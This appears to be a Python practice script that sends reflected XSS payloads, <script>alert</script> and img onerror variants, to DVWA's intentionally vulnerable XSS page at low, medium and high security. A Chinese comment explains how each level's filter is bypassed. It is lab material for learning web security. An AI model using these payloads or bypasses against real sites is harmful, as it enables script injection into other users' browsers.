from dvwa import DVWA

SECURITY = "low"
PAYLOADS = {
    "low": [
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(document.domain)>",
    ],
    "medium": [
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(document.domain)>",
    ],
    "high": [
        "<img src=x onerror=alert(document.domain)>",
    ],
}
"""
Low: 原样输出
Medium: 只把 <script> 替换成空, 用 img onerror 绕过
High: 正则删掉带 script 的标签, 用 img onerror 绕过
"""

target = DVWA("xss_r", SECURITY)

for payload in PAYLOADS[SECURITY]:
    response = target.get("", params={"name": payload})
    reflected = payload in response.text
    print(f"{'OK' if reflected else 'Blocked'}: {payload}")
